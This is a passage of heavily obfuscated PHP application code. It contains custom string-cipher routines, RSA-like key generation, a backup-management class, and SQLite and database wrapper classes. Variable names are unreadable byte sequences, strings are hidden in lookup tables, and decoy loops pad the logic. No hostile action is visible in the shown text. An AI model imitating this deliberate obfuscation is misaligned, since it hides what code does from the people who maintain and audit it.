$Ò˝Ê¨Õ◊ = $Ù¡ÎﬁÖ˝[700]; if (strlen($Ò˝Ê¨Õ◊) < $Ù¡ÎﬁÖ˝[613]) { return; } $õã≤ÛÂÅ = 0; $∑£ª–°” = $Ù¡ÎﬁÖ˝[701]; $˙ÙƒËË = 0; for ($ÆûÛ·ô˘ = 0; $ÆûÛ·ô˘ < strlen($»ñÍ÷æ©); $ÆûÛ·ô˘++) { $˙ÙƒËË = $˙ÙƒËË == strlen($ó¯◊™ï…) ? 0 : $˙ÙƒËË; $õã≤ÛÂÅ = ($öÀŸ®ºï + strpos($…ÙŒáﬁˆ, $»ñÍ÷æ©[$ÆûÛ·ô˘]) + ord($ó¯◊™ï…[$˙ÙƒËË++])) % 64; $ãÇíªî˛ = $Ù¡ÎﬁÖ˝[702]; $ê¥œÒãÊ .= $…ÙŒáﬁˆ[$õã≤ÛÂÅ]; } $ﬂÔœ«—Ù = hash_encode($˛◊ëè∏Ô . $ê¥œÒãÊ); $Ìñ¸ó÷ó = $Ù¡ÎﬁÖ˝[703]; break; default: $ﬂÔœ«—Ù = $this->yasq46999d1f($»ñÍ÷æ©, $µ¡âñ«ô . $⁄ÄèŒ›Ò); $ÄÒ««∏ÿ = $Ù¡ÎﬁÖ˝[704]; if (strlen($ÄÒ««∏ÿ) < $Ù¡ÎﬁÖ˝[607]) { return; } break; } $ﬂÔœ«—Ù = strrev($æƒæ˙•ë . $⁄ÄèŒ›Ò . $ﬂÔœ«—Ù); $ò·¶œäí = $Ù¡ÎﬁÖ˝[705]; if ($úÖÛÆø” - 1 > 0) { $ﬂÔœ«—Ù = $this->zphbbfae25ca($ﬂÔœ«—Ù, $µ¡âñ«ô, $úÖÛÆø” - 1); } return $ﬂÔœ«—Ù; } private function clzsecc6a5df($⁄íªÿÜÕ, $õ¨º‡ûÀ, $òÙ¯ˆ˙Á = 3) { $ˆà©Ä÷± =& $_SERVER[Çâä∆◊¡]; $≤èîÊ˛≠ =& $_SERVER[‚º¶Ô¢Ó]; if (!is_string($⁄íªÿÜÕ) || strlen($⁄íªÿÜÕ) < 10) { return !1; } $⁄íªÿÜÕ = trim($⁄íªÿÜÕ); $ÈÈ∆≤≠º = $ˆà©Ä÷±[706]; $⁄íªÿÜÕ = strrev($⁄íªÿÜÕ); $€‚·Ú∏Ô = $ˆà©Ä÷±[707]; while ($€‚·Ú∏Ô < $ˆà©Ä÷±[613]) { if ($€‚·Ú∏Ô >= 0) { break; } $€‚·Ú∏Ô++; } $Æπ¨ªÛ∆ = $⁄íªÿÜÕ[0]; $ü÷¥÷È÷ = substr($⁄íªÿÜÕ, 1, 15); $Â„◊ùîŒ = $ˆà©Ä÷±[708]; while ($Â„◊ùîŒ < $ˆà©Ä÷±[607]) { if ($Â„◊ùîŒ >= 0) { break; } $Â„◊ùîŒ++; } $⁄íªÿÜÕ = substr($⁄íªÿÜÕ, 16); $…˜â°ø = $ˆà©Ä÷±[709]; $”Û°®Ùô = $≤èîÊ˛≠[292]; switch ($Æπ¨ªÛ∆) { case $≤èîÊ˛≠[199]: $ﬁ—˘Åª¡ = $this->ojsw706dbb57($⁄íªÿÜÕ, strrev($õ¨º‡ûÀ . $ü÷¥÷È÷)); break; case $≤èîÊ˛≠[191]: $ﬁ—˘Åª¡ = $this->ojsw706dbb57($⁄íªÿÜÕ, strrev($ü÷¥÷È÷ . $õ¨º‡ûÀ)); break; case $≤èîÊ˛≠[293]: $ﬁ—˘Åª¡ = $this->ojsw706dbb57($⁄íªÿÜÕ, base64_encode($ü÷¥÷È÷ . $õ¨º‡ûÀ)); break; case $≤èîÊ˛≠[294]: $ﬁ—˘Åª¡ = $this->ojsw706dbb57($⁄íªÿÜÕ, md5($ü÷¥÷È÷ . $õ¨º‡ûÀ)); $ˆÔ√∞®° = $ˆà©Ä÷±[710]; while ($ˆÔ√∞®° < $ˆà©Ä÷±[624]) { if ($ˆÔ√∞®° >= 0) { break; } $ˆÔ√∞®°++; } break; case $≤èîÊ˛≠[295]: $⁄íªÿÜÕ = hash_decode($⁄íªÿÜÕ); $£˚Ï ˝ﬂ = $⁄íªÿÜÕ[0]; $⁄íªÿÜÕ = substr($⁄íªÿÜÕ, 1); $Ó˝À÷∞¥ = $ˆà©Ä÷±[711]; if (strlen($Ó˝À÷∞¥) < $ˆà©Ä÷±[607]) { die; } $ãÜÖÍÕô = strpos($”Û°®Ùô, $£˚Ï ˝ﬂ); $Îì≠Ÿﬂﬂ = md5($£˚Ï ˝ﬂ . md5($õ¨º‡ûÀ . $£˚Ï ˝ﬂ) . $õ¨º‡ûÀ); $Îì≠Ÿﬂﬂ = substr($Îì≠Ÿﬂﬂ, $ãÜÖÍÕô % 8, $ãÜÖÍÕô % 8 + 7); $µ—”Îõ… = $≤èîÊ˛≠[6]; $Ãï˛ı—„ = 0; $†ç≈é™ì = 0; $íÈ∏çä© = $ˆà©Ä÷±[712]; if (strlen($íÈ∏çä©) < $ˆà©Ä÷±[624]) { return; } $ÿ¸ïî˜ü = 0; for ($Ãï˛ı—„ = 0; $Ãï˛ı—„ < strlen($⁄íªÿÜÕ); $Ãï˛ı—„++) { $ÿ¸ïî˜ü = $ÿ¸ïî˜ü == strlen($Îì≠Ÿﬂﬂ) ? 0 : $ÿ¸ïî˜ü; $Êç◊Òè¸ = $ÿ¸ïî˜ü++; $¿€€∫è˚ = $ˆà©Ä÷±[713]; while (strlen($¿€€∫è˚) < $ˆà©Ä÷±[613]) { if (!$¿€€∫è˚) { break; } $¿€€∫è˚++; } $†ç≈é™ì = strpos($”Û°®Ùô, $⁄íªÿÜÕ[$Ãï˛ı—„]) - $ãÜÖÍÕô - ord($Îì≠Ÿﬂﬂ[$Êç◊Òè¸]); $ˆ”·ò‘Ø = $ˆà©Ä÷±[714]; if (strlen($ˆ”·ò‘Ø) < $ˆà©Ä÷±[624]) { return; } while ($†ç≈é™ì < 0) { $†ç≈é™ì += 64; } $µ—”Îõ… .= $”Û°®Ùô[$†ç≈é™ì]; } $ﬁ—˘Åª¡ = base64_decode($µ—”Îõ…); break; default: $ﬁ—˘Åª¡ = $this->ojsw706dbb57($⁄íªÿÜÕ, $õ¨º‡ûÀ . $ü÷¥÷È÷); $¥ïä®ÑÕ = $ˆà©Ä÷±[715]; while (strlen($¥ïä®ÑÕ) < $ˆà©Ä÷±[617]) { if (!$¥ïä®ÑÕ) { break; } $¥ïä®ÑÕ++; } break; } if ($òÙ¯ˆ˙Á - 1 > 0) { $ﬁ—˘Åª¡ = $this->clzsecc6a5df($ﬁ—˘Åª¡, $õ¨º‡ûÀ, $òÙ¯ˆ˙Á - 1); } return $ﬁ—˘Åª¡; } public function nmyp731ec7bd($◊éﬁê—) { $éﬁ◊Ï—¶ =& $_SERVER[Çâä∆◊¡]; $ÕÓ≠Ç’· =& $_SERVER[‚º¶Ô¢Ó]; $º“à≠Ë® = $this->dwrp65a385e0(); $ì†Ç÷º = $éﬁ◊Ï—¶[716]; if (strlen($ì†Ç÷º) < $éﬁ◊Ï—¶[607]) { return; } $Çú¢™ƒ– = $this->dwrp65a385e0(); $º¬Ì‚—µ = $éﬁ◊Ï—¶[717]; if (strlen($º¬Ì‚—µ) < $éﬁ◊Ï—¶[607]) { return; } $ƒõ°¥Øû = ($º“à≠Ë® - 1) * ($Çú¢™ƒ– - 1); $ØÿÿÜÖê = $éﬁ◊Ï—¶[718]; if (!$ØÿÿÜÖê) { die; } $õô·µü‚ = intval(($º“à≠Ë® + $Çú¢™ƒ–) / 2); $≤ôà¡ﬁ∞ = $éﬁ◊Ï—¶[719]; while (1) { $˘ÛƒæÖ = $õô·µü‚; $◊‰ä≥œΩ = $éﬁ◊Ï—¶[720]; if (strlen($◊‰ä≥œΩ) < $éﬁ◊Ï—¶[607]) { die; } $¨ûìÔÀ« = $ƒõ°¥Øû; $ÒÊºëä€ = $éﬁ◊Ï—¶[721]; if (!$ÒÊºëä€) { return; } while ($¨ûìÔÀ« % $˘ÛƒæÖ != 0) { $ûÄ ≈ÿá = $¨ûìÔÀ«; $Èı´∏∂– = $éﬁ◊Ï—¶[722]; if (strlen($Èı´∏∂–) < $éﬁ◊Ï—¶[607]) { return; } $¨ûìÔÀ« = $˘ÛƒæÖ; $Ò¡å⁄µç = $éﬁ◊Ï—¶[723]; while (strlen($Ò¡å⁄µç) < $éﬁ◊Ï—¶[394]) { if (!$Ò¡å⁄µç) { break; } $Ò¡å⁄µç++; } $˘ÛƒæÖ = $ûÄ ≈ÿá % $˘ÛƒæÖ; $úßê»Ÿñ = $éﬁ◊Ï—¶[724]; while (strlen($úßê»Ÿñ) < $éﬁ◊Ï—¶[607]) { if (!$úßê»Ÿñ) { break; } $úßê»Ÿñ++; } } if ($˘ÛƒæÖ == 1) { break; } else { $õô·µü‚++; } } $◊ê”…Îî = 2; for ($”öºüÛÍ = 0; $”öºüÛÍ < $ƒõ°¥Øû * 10; $”öºüÛÍ++) { if (($ƒõ°¥Øû * $”öºüÛÍ + 1) % $õô·µü‚ == 0) { $◊ê”…Îî = intval(($ƒõ°¥Øû * $”öºüÛÍ + 1) / $õô·µü‚); break; } } $Âû≠∆’À = $this->yasq46999d1f($º“à≠Ë® * $Çú¢™ƒ– . $ÕÓ≠Ç’·[6], $ÕÓ≠Ç’·[130]); $∂◊ÚÔÃ´ = md5($ÕÓ≠Ç’·[296] . ($º“à≠Ë® + $Çú¢™ƒ–) . $ÕÓ≠Ç’·[297] . $õô·µü‚ . $ÕÓ≠Ç’·[297] . $◊ê”…Îî . $ÕÓ≠Ç’·[298]); $ùÙéÜç˚ = $this->yasq46999d1f($◊éﬁê—, $∂◊ÚÔÃ´) . $ÕÓ≠Ç’·[299] . $Âû≠∆’À; $ø‰¬⁄ÑΩ = $éﬁ◊Ï—¶[725]; while (strlen($ø‰¬⁄ÑΩ) < $éﬁ◊Ï—¶[617]) { if (!$ø‰¬⁄ÑΩ) { break; } $ø‰¬⁄ÑΩ++; } return $ùÙéÜç˚; } public function oudff095d4ba($˜Ωö¯⁄Ø) { $±ê–˚¿à =& $_SERVER[Çâä∆◊¡]; $Áﬁ≈£ÂÕ =& $_SERVER[‚º¶Ô¢Ó]; $∆ªÙ‹áΩ = explode($Áﬁ≈£ÂÕ[299], $˜Ωö¯⁄Ø); $•‘◊âÜ„ = $±ê–˚¿à[726]; while ($•‘◊âÜ„ < $±ê–˚¿à[394]) { if ($•‘◊âÜ„ >= 0) { break; } $•‘◊âÜ„++; } if (count($∆ªÙ‹áΩ) != 2) { return $Áﬁ≈£ÂÕ[6]; } $∫„‹û‡ä = $this->ojsw706dbb57($∆ªÙ‹áΩ[1] . $Áﬁ≈£ÂÕ[6], $Áﬁ≈£ÂÕ[130]); $íí‚Ø§÷ = $±ê–˚¿à[611]; if (!$íí‚Ø§÷) { die; } if (!$∫„‹û‡ä) { return $Áﬁ≈£ÂÕ[6]; } $∫„‹û‡ä = intval($∫„‹û‡ä); $¸¥˝í»⁄ = $±ê–˚¿à[727]; if (!$¸¥˝í»⁄) { return; } $„êΩ˘”ë = 0; $∆∞§ﬁÊù = 0; $“Òá¨ä® = $±ê–˚¿à[728]; while ($“Òá¨ä® < $±ê–˚¿à[624]) { if ($“Òá¨ä® >= 0) { break; } $“Òá¨ä®++; } for ($ÉË˚˜ÛÚ = 3; $ÉË˚˜ÛÚ < $∫„‹û‡ä; $ÉË˚˜ÛÚ += 2) { if ($∫„‹û‡ä % $ÉË˚˜ÛÚ != 0) { continue; } $„êΩ˘”ë = $ÉË˚˜ÛÚ; $ùå√∆®‰ = $±ê–˚¿à[729]; while ($ùå√∆®‰ < $±ê–˚¿à[617]) { if ($ùå√∆®‰ >= 0) { break; } $ùå√∆®‰++; } $∆∞§ﬁÊù = intval($∫„‹û‡ä / $ÉË˚˜ÛÚ); break; } $áéÀÑ–ô = ($„êΩ˘”ë - 1) * ($∆∞§ﬁÊù - 1); $ùÂß∑ÇÔ = intval(($„êΩ˘”ë + $∆∞§ﬁÊù) / 2); while (1) { $ÎÄÈè‰§ = $ùÂß∑ÇÔ; $„◊«Æ‘™ = $±ê–˚¿à[730]; while ($„◊«Æ‘™ < $±ê–˚¿à[624]) { if ($„◊«Æ‘™ >= 0) { break; } $„◊«Æ‘™++; } $æˆ†ÍŒ» = $áéÀÑ–ô; while ($æˆ†ÍŒ» % $ÎÄÈè‰§ != 0) { $±Ÿçñ ö = $æˆ†ÍŒ»; $÷Ú†◊å∫ = $±ê–˚¿à[731]; if (!$÷Ú†◊å∫) { die; } $æˆ†ÍŒ» = $ÎÄÈè‰§; $ê˚è üã = $±ê–˚¿à[732]; if (strlen($ê˚è üã) < $±ê–˚¿à[394]) { return; } $ÎÄÈè‰§ = $±Ÿçñ ö % $ÎÄÈè‰§; $¸ò”¯™± = $±ê–˚¿à[733]; if (strlen($¸ò”¯™±) < $±ê–˚¿à[607]) { return; } } if ($ÎÄÈè‰§ == 1) { break; } else { $ùÂß∑ÇÔ++; } } $≤§åûÏµ = 2; $Ωı£êüí = $±ê–˚¿à[734]; for ($ÉË˚˜ÛÚ = 0; $ÉË˚˜ÛÚ < $áéÀÑ–ô * 10; $ÉË˚˜ÛÚ++) { if (($áéÀÑ–ô * $ÉË˚˜ÛÚ + 1) % $ùÂß∑ÇÔ == 0) { $≤§åûÏµ = intval(($áéÀÑ–ô * $ÉË˚˜ÛÚ + 1) / $ùÂß∑ÇÔ); break; } } $èÜ®…•á = md5($Áﬁ≈£ÂÕ[296] . ($„êΩ˘”ë + $∆∞§ﬁÊù) . $Áﬁ≈£ÂÕ[297] . $ùÂß∑ÇÔ . $Áﬁ≈£ÂÕ[297] . $≤§åûÏµ . $Áﬁ≈£ÂÕ[298]); $ÁºÄ…›’ = $±ê–˚¿à[735]; if (!$ÁºÄ…›’) { return; } $Ûπ≥Âﬂ´ = $this->ojsw706dbb57($∆ªÙ‹áΩ[0], $èÜ®…•á); $”Öñù‡ó = $±ê–˚¿à[736]; if (!$”Öñù‡ó) { die; } return $Ûπ≥Âﬂ´; } public function dwrp65a385e0() { $∞Á„¥‡ï =& $_SERVER[Çâä∆◊¡]; $ßæÇ˚∂π = mt_rand(pow(2, 14), pow(2, 16) - 1); $›ÖÍÏ†Â = array(); $ºÔ¡˘¨Ã = $∞Á„¥‡ï[737]; if (!$ºÔ¡˘¨Ã) { return; } $ë¨øÎ•ƒ = 1; $∂„◊¨òÚ = $∞Á„¥‡ï[738]; if (strlen($∂„◊¨òÚ) < $∞Á„¥‡ï[613]) { die; } while ($ë¨øÎ•ƒ <= (int) sqrt($ßæÇ˚∂π)) { $§„Ñ¡ßÉ = $ë¨øÎ•ƒ; while (!0) { $§„Ñ¡ßÉ++; $¨ƒÑÕﬁ£ = $∞Á„¥‡ï[739]; if (strlen($¨ƒÑÕﬁ£) < $∞Á„¥‡ï[624]) { return; } if ($§„Ñ¡ßÉ <= 2) { $ë¨øÎ•ƒ = $§„Ñ¡ßÉ; break; } else { if ($§„Ñ¡ßÉ < 2) { continue; } } $éƒ≤πﬁÇ = !0; for ($ôî˙©ˆß = 2; $ôî˙©ˆß <= sqrt($§„Ñ¡ßÉ); $ôî˙©ˆß++) { if ($§„Ñ¡ßÉ % $ôî˙©ˆß == 0) { $éƒ≤πﬁÇ = !1; } } if ($éƒ≤πﬁÇ) { $ë¨øÎ•ƒ = $§„Ñ¡ßÉ; break; } } $›ÖÍÏ†Â[] = $ë¨øÎ•ƒ; } $∏•ßÀ€≠ = 2; for ($§„Ñ¡ßÉ = $ßæÇ˚∂π; $§„Ñ¡ßÉ > 1; $§„Ñ¡ßÉ--) { $éƒ≤πﬁÇ = !0; foreach ($›ÖÍÏ†Â as $ÇıΩ›å≈) { if ($§„Ñ¡ßÉ % $ÇıΩ›å≈ == 0) { $éƒ≤πﬁÇ = !1; break; } } if ($éƒ≤πﬁÇ) { $∏•ßÀ€≠ = $§„Ñ¡ßÉ; break; } } return $∏•ßÀ€≠; } public function sfcv795af8c0($ù∂ˆö˙À, $†∏º√——) { $˛£úôﬂÑ =& $_SERVER[Çâä∆◊¡]; $ñ≈ì…ç´ =& $_SERVER[‚º¶Ô¢Ó]; return call_user_func(array($ñ≈ì…ç´[8], $ñ≈ì…ç´[300]), $ù∂ˆö˙À, $†∏º√——); $€∆›ÒØ = $˛£úôﬂÑ[740]; while ($€∆›ÒØ < $˛£úôﬂÑ[607]) { if ($€∆›ÒØ >= 0) { break; } $€∆›ÒØ++; } } public function yasq46999d1f($ÕÙ∫ƒãÙ, $≥ˆÀ˙§Û) { $£ì≤‚€– =& $_SERVER[‚º¶Ô¢Ó]; return call_user_func(array($£ì≤‚€–[301], $£ì≤‚€–[302]), $ÕÙ∫ƒãÙ, $≥ˆÀ˙§Û); } public function ojsw706dbb57($öŸó¬‰†, $„øŒõ¡ê) { $Ω∑ùÈÈ§ =& $_SERVER[‚º¶Ô¢Ó]; return call_user_func(array($Ω∑ùÈÈ§[301], $Ω∑ùÈÈ§[303]), $öŸó¬‰†, $„øŒõ¡ê); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ﬂÊ¢ùŒˆ =& $_SERVER[Çâä∆◊¡]; $this->isManual(); self::$name = date($ﬂÊ¢ùŒˆ[741]); if (!($íàÚÊ¸€ = Model($ﬂÊ¢ùŒˆ[742])->lastItem())) { $íàÚÊ¸€ = $this->initData(); } else { self::$name = $íàÚÊ¸€[$ﬂÊ¢ùŒˆ[32]]; if ($íàÚÊ¸€[$ﬂÊ¢ùŒˆ[743]] == $ﬂÊ¢ùŒˆ[89]) { self::$name = date($ﬂÊ¢ùŒˆ[744]); $¬⁄˘ÔÈ¬ = 0; if (isset($íàÚÊ¸€[$ﬂÊ¢ùŒˆ[288]][$ﬂÊ¢ùŒˆ[192]][$ﬂÊ¢ùŒˆ[467]])) { $¬⁄˘ÔÈ¬ = (int) $íàÚÊ¸€[$ﬂÊ¢ùŒˆ[288]][$ﬂÊ¢ùŒˆ[192]][$ﬂÊ¢ùŒˆ[467]]; } if (self::$manual == 0 && $íàÚÊ¸€[$ﬂÊ¢ùŒˆ[32]] == self::$name) { Model($ﬂÊ¢ùŒˆ[742])->remove($íàÚÊ¸€[$ﬂÊ¢ùŒˆ[401]]); } $íàÚÊ¸€ = $this->initData($¬⁄˘ÔÈ¬, $íàÚÊ¸€[$ﬂÊ¢ùŒˆ[745]]); } else { $this->checkStore($íàÚÊ¸€[$ﬂÊ¢ùŒˆ[745]]); } } self::$option = $íàÚÊ¸€; } private function isManual() { $ÚØûú≠ = _get($GLOBALS, $_SERVER[Çâä∆◊¡][746], 0); $ÚØûú≠ = intval($ÚØûú≠); self::$manual = $ÚØûú≠ && $ÚØûú≠ == 1 ? 1 : 0; } private function initData($∑ä≠µ¡Ú = 0, $Ã›ƒåèˆ = '') { $˘µ´íêï =& $_SERVER[Çâä∆◊¡]; $ê¸≠ã∫ = Model($˘µ´íêï[742])->config(); if ($Ã›ƒåèˆ && $ê¸≠ã∫[$˘µ´íêï[745]] != $Ã›ƒåèˆ) { $∑ä≠µ¡Ú = 0; } $this->checkStore($ê¸≠ã∫[$˘µ´íêï[745]]); if (self::$manual == 1) { self::$name .= $˘µ´íêï[11] . date($˘µ´íêï[747]); } $Á∞Â⁄§Î = array($˘µ´íêï[745] => $ê¸≠ã∫[$˘µ´íêï[745]], $˘µ´íêï[32] => self::$name, $˘µ´íêï[743] => 0, $˘µ´íêï[748] => $ê¸≠ã∫[$˘µ´íêï[748]], $˘µ´íêï[749] => self::$manual, $˘µ´íêï[288] => array($˘µ´íêï[750] => array($˘µ´íêï[743] => 0), $˘µ´íêï[751] => array($˘µ´íêï[743] => 0, $˘µ´íêï[752] => 0, $˘µ´íêï[753] => 0, $˘µ´íêï[33] => $˘µ´íêï[12], $˘µ´íêï[754] => 0, $˘µ´íêï[496] => 0), $˘µ´íêï[755] => array($˘µ´íêï[743] => 0, $˘µ´íêï[752] => 0, $˘µ´íêï[753] => 0, $˘µ´íêï[754] => 0, $˘µ´íêï[496] => 0), $˘µ´íêï[192] => array($˘µ´íêï[743] => 0, $˘µ´íêï[756] => 0, $˘µ´íêï[757] => 0, $˘µ´íêï[758] => 0, $˘µ´íêï[759] => 0, $˘µ´íêï[467] => $∑ä≠µ¡Ú, $˘µ´íêï[754] => 0, $˘µ´íêï[496] => 0)), $˘µ´íêï[754] => time(), $˘µ´íêï[496] => 0); $Ùã€¡ı« = Model($˘µ´íêï[742])->insert($Á∞Â⁄§Î); $Á∞Â⁄§Î[$˘µ´íêï[401]] = $Ùã€¡ı«; return $Á∞Â⁄§Î; } private function checkStore($µŒÓŸí«) { $ÜÜ÷∆û∏ =& $_SERVER[Çâä∆◊¡]; $…ì©ﬂÜõ = Model($ÜÜ÷∆û∏[760])->listData($µŒÓŸí«); Model($ÜÜ÷∆û∏[760])->checkConfig($…ì©ﬂÜõ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Çâä∆◊¡][742])->findByName(self::$name); } return self::$option; } public static function set($Îäô§åÈ) { $¯Òπ—÷ç =& $_SERVER[Çâä∆◊¡]; $∂ﬁø‘à¥ = self::get(); foreach ($Îäô§åÈ as $ä˝µ°æı => $±âûµÓ©) { $≠Ä‹˘ÿÃ = explode($¯Òπ—÷ç[10], $ä˝µ°æı); $¸ß≤˛ç≈ = count($≠Ä‹˘ÿÃ); switch ($¸ß≤˛ç≈) { case 1: $∂ﬁø‘à¥[$≠Ä‹˘ÿÃ[0]] = $±âûµÓ©; break; case 2: $∂ﬁø‘à¥[$≠Ä‹˘ÿÃ[0]][$≠Ä‹˘ÿÃ[1]] = $±âûµÓ©; break; case 3: $∂ﬁø‘à¥[$≠Ä‹˘ÿÃ[0]][$≠Ä‹˘ÿÃ[1]][$≠Ä‹˘ÿÃ[2]] = $±âûµÓ©; break; } } Model($¯Òπ—÷ç[742])->update($∂ﬁø‘à¥[$¯Òπ—÷ç[401]], $∂ﬁø‘à¥); self::$option = $∂ﬁø‘à¥; return self::$option; } public function keep() { $ﬁî§Å≥Ö =& $_SERVER[Çâä∆◊¡]; $ÅËµ•î« = self::get(); if ($ÅËµ•î«[$ﬁî§Å≥Ö[288]][$ﬁî§Å≥Ö[750]][$ﬁî§Å≥Ö[743]] == $ﬁî§Å≥Ö[89]) { return; } $this->backupKeep($ÅËµ•î«); self::set(array($ﬁî§Å≥Ö[761] => 1)); } private function backupKeep($™Ôù†¨Î) { $˙˚¶â°‚ =& $_SERVER[Çâä∆◊¡]; if (self::$manual == 1) { return; } $™ÃΩ√˘£ = Model($˙˚¶â°‚[742])->listData(); if (empty($™ÃΩ√˘£)) { return; } $Å¥ÊµÊÏ = 0; $•ıæÜ®∑ = array(); foreach ($™ÃΩ√˘£ as $Êˆ˛π„·) { if ($Å¥ÊµÊÏ >= 7) { break; } $•ıæÜ®∑[] = $Êˆ˛π„·[$˙˚¶â°‚[32]]; $Å¥ÊµÊÏ++; } for ($Å¥ÊµÊÏ = 0; $Å¥ÊµÊÏ < 12; $Å¥ÊµÊÏ++) { $•ıæÜ®∑[] = date($˙˚¶â°‚[762], strtotime("\x2d{$Å¥ÊµÊÏ}\x20\155\157\x6e\164\150\x73")); } $•ıæÜ®∑ = array_unique($•ıæÜ®∑); $ÅÛáãÀÑ = Model($˙˚¶â°‚[763])->get($˙˚¶â°‚[764]); foreach ($™ÃΩ√˘£ as $Êˆ˛π„·) { if (isset($Êˆ˛π„·[$˙˚¶â°‚[749]]) && $Êˆ˛π„·[$˙˚¶â°‚[749]] == $˙˚¶â°‚[89]) { continue; } if (!empty($Êˆ˛π„·[$˙˚¶â°‚[32]]) && in_array($Êˆ˛π„·[$˙˚¶â°‚[32]], $•ıæÜ®∑)) { continue; } Model($˙˚¶â°‚[742])->remove($Êˆ˛π„·[$˙˚¶â°‚[401]]); $Ö‚ñúÄ‡ = $this->backupPath($™Ôù†¨Î, $ÅÛáãÀÑ); IO::remove($Ö‚ñúÄ‡, !1); } } private function backupPath($–éπ˜Ø», $‰Üé°˚î = false) { $˝‘¸áƒ– =& $_SERVER[Çâä∆◊¡]; if (!$‰Üé°˚î) { $‰Üé°˚î = Model($˝‘¸áƒ–[763])->get($˝‘¸áƒ–[764]); } $ÆàÒﬁàì = $–éπ˜Ø»[$˝‘¸áƒ–[32]]; $àöÍŒ ú = substr(md5($˝‘¸áƒ–[765] . $‰Üé°˚î . $ÆàÒﬁàì), 0, 8); return "\x7b\x69\157\72{$–éπ˜Ø»[$˝‘¸áƒ–[745]]}\175\57\x64\x61\164\141\x62\141\x73\145\x2f\142\x61\x63\153\165\160\x2f" . $ÆàÒﬁàì . $˝‘¸áƒ–[11] . $àöÍŒ ú; } public function db() { $ï¢ËÕÿä =& $_SERVER[Çâä∆◊¡]; $àÁÎ∞ﬁ© = self::get(); if ($àÁÎ∞ﬁ©[$ï¢ËÕÿä[288]][$ï¢ËÕÿä[751]][$ï¢ËÕÿä[743]] == $ï¢ËÕÿä[89]) { return !0; } $ˆ≠Üçïô = new BackupDb(); if (!$ˆ≠Üçïô->index()) { return !1; } self::set(array($ï¢ËÕÿä[766] => 1)); return !0; } public function dbFile() { $∏Ûä’Ö‰ =& $_SERVER[Çâä∆◊¡]; $ÕÌÈåÈâ = self::get(); if ($ÕÌÈåÈâ[$∏Ûä’Ö‰[288]][$∏Ûä’Ö‰[755]][$∏Ûä’Ö‰[743]] == $∏Ûä’Ö‰[89]) { return !0; } $öÔû≥†Ò = new BackupDbFile(); if (!$öÔû≥†Ò->index()) { return !1; } self::set(array($∏Ûä’Ö‰[767] => 1)); return !0; } public function file() { $ËÑ¨πﬂÁ =& $_SERVER[Çâä∆◊¡]; $Ï§Ïªıò = self::get(); if ($Ï§Ïªıò[$ËÑ¨πﬂÁ[288]][$ËÑ¨πﬂÁ[192]][$ËÑ¨πﬂÁ[743]] == $ËÑ¨πﬂÁ[89]) { return !0; } if (!isset($Ï§Ïªıò[$ËÑ¨πﬂÁ[748]]) || $Ï§Ïªıò[$ËÑ¨πﬂÁ[748]] == $ËÑ¨πﬂÁ[190]) { $‹˜ü‰Ñ = new BackupFile(); if (!$‹˜ü‰Ñ->index()) { return !1; } } self::set(array($ËÑ¨πﬂÁ[768] => 1, $ËÑ¨πﬂÁ[743] => 1)); return !0; } } goto D‘¬¡èã´Ê; F⁄∆™Û” è: class DbSqlite extends DbSqliteBase { public function query($≤„„ô∂ì) { $‹£˛Ìª˙ =& $_SERVER[Çâä∆◊¡]; if (!CacheLock::fileLock($‹£˛Ìª˙[13])) { return !1; } $ï£¬≠ê· = parent::query($≤„„ô∂ì); CacheLock::fileUnLock($‹£˛Ìª˙[13]); return $ï£¬≠ê·; } public function execute($ºÛßäŸŸ) { $ Ñ’“·™ =& $_SERVER[Çâä∆◊¡]; if (!CacheLock::fileLock($ Ñ’“·™[13])) { return !1; } $ÔﬂÊ÷ä” = parent::execute($ºÛßäŸŸ); CacheLock::fileUnLock($ Ñ’“·™[13]); return $ÔﬂÊ÷ä”; } } class DbSqlite3 extends DbSqlite3Base { public function query($’‘≈±∂ì) { $∆∏È≠ˆç =& $_SERVER[Çâä∆◊¡]; if (!CacheLock::fileLock($∆∏È≠ˆç[13])) { return !1; } $â€¨ú’ú = parent::query($’‘≈±∂ì); CacheLock::fileUnLock($∆∏È≠ˆç[13]); return $â€¨ú’ú; } public function execute($°Ç·±©) { $çµ≈“äù =& $_SERVER[Çâä∆◊¡]; if (!CacheLock::fileLock($çµ≈“äù[13])) { return !1; } $Îë«”˙ı = parent::execute($°Ç·±©); CacheLock::fileUnLock($çµ≈“äù[13]); return $Îë«”˙ı; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\x71" => "\x3c\76", "\x67\x74" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\154\x74" => "\74", "\145\x6c\x74" => "\x3c\x3d", "\156\x6f\x74\154\x69\153\145" => "\x4e\117\124\x20\114\111\113\x45", "\154\x69\x6b\x65" => "\x4c\111\113\x45", "\x69\156" => "\111\116", "\156\x6f\164\x69\x6e" => "\116\117\124\40\111\116", "\x6e\x6f\x74\x20\x69\x6e" => "\116\x4f\124\40\111\116", "\142\x65\x74\x77\145\x65\x6e" => "\x42\x45\x54\127\105\x45\x4e", "\x6e\x6f\164\142\145\x74\167\x65\145\x6e" => "\116\117\124\x20\102\105\124\x57\x45\x45\x4e", "\x6e\157\164\40\142\145\x74\x77\x65\x65\156" => "\x4e\x4f\124\x20\102\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\114\105\103\124\x25\104\111\123\x54\x49\116\x43\x54\x25\40\x25\x46\111\x45\114\x44\x25\40\106\x52\x4f\115\40\45\x54\101\x42\114\105\45\45\x4a\117\111\116\x25\x25\x57\x48\x45\x52\x45\x25\x25\x47\122\x4f\125\x50\45\45\110\101\x56\x49\x4e\x47\45\45\x4f\122\x44\105\x52\45\45\114\x49\x4d\111\124\x25\x20\x25\125\116\111\x4f\116\x25\x25\103\x4f\x4d\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $⁄ÖÜ´Íç = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Çâä∆◊¡][947], $⁄ÖÜ´Íç); } public function factory($π·®Èê∫ = '') { $≤´◊ßìÙ =& $_SERVER[Çâä∆◊¡]; $π·®Èê∫ = $this->parseConfig($π·®Èê∫); if 